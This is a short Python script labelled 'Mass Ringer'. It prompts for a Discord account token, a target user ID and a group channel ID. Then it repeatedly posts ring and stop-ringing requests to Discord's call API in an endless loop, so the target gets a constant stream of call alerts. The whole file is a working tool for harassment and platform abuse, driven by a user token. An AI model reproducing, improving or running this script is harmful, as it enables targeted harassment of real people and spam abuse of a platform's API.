import requests
from pystyle import *
from threading import Thread
import os
import logging
logging.basicConfig(
    level=logging.INFO,
    format="\x1b[38;5;63m[\x1b[0m%(asctime)s\x1b[38;5;63m]\x1b[0m %(message)s",
    datefmt="%H:%M:%S"
)
ascii = ("""
                      :::!~!!!!!:.
                  .xUHWH!! !!?M88WHX:.
                .X*#M@$!!  !X!M$$$$$$WWx:.
               :!!!!!!?H! :!$!$$$$$$$$$$8X:
              !!~  ~:~!! :~!$!#$$$$$$$$$$8X:
             :!~::!H!<   ~.U$X!?R$$$$$$$$MM!
             ~!~!!!!~~ .:XW$$$U!!?$$$$$$RMM!
               !:~~~ .:!M"T#$$$$WX??#MRRMMM!
               ~?WuxiW*`   `"#$$$$8!!!!??!!!
             :X- M$$$$       `"T#$T~!8$WUXU~
            :%`  ~#$$$m:        ~!~ ?$$$$$$
          :!`.-   ~T$$$$8xx.  .xWW- ~""##*"
.....   -~~:<` !    ~?T#$$@@W@*?$$      /`
W$@@M!!! .!~~ !!     .:XUW$W!~ `"~:    :
#"~~`.:x%`!!  !H:   !WM$$$$Ti.: .!WUn+!`
:::~:!!`:X~ .: ?H.!u "$$$B$$$!W:U!T$$M~
.~~   :X@!.-~   ?@WTWo("*$$$W$TH$! `
Wi.~!X$?!-~    : ?$$$B$Wu("**$RM!
$R@i.~~ !     :   ~$$$$$B$$en:``
?MXT@Wx.~    :     ~"##*$$$$M~""")
os.system("title [Mass Ringer] Status: Loading...")
os.system("cls")
print(Colorate.Horizontal(Colors.purple_to_blue,(ascii)))
Token = input(Colorate.Horizontal(Colors.purple_to_blue,("\n\n\n\nToken: ")))
UserID = input(Colorate.Horizontal(Colors.purple_to_blue,("UserID: ")))
groupID = input(Colorate.Horizontal(Colors.purple_to_blue,("GroupID: ")))
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:104.0) Gecko/20100101 Firefox/104.0',
    'Authorization': (Token),
}

json_data = {
    'recipients': [
        UserID,
    ],
}
os.system("title [Mass Ringer] Status: Ringing")
def ring():
    ring = requests.post(f'https://discord.com/api/v9/channels/{groupID}/call/ring',headers=headers, json=json_data)
    if ring.status_code == 204:
        logging.critical ("Ringed " + (UserID))
    stopring = requests.post(f'https://discord.com/api/v9/channels/{groupID}/call/stop-ringing', headers=headers, json=json_data)
    if stopring.status_code == 204:
        logging.critical(f"UnRinged {UserID}")
    


while True:
    ring()

    
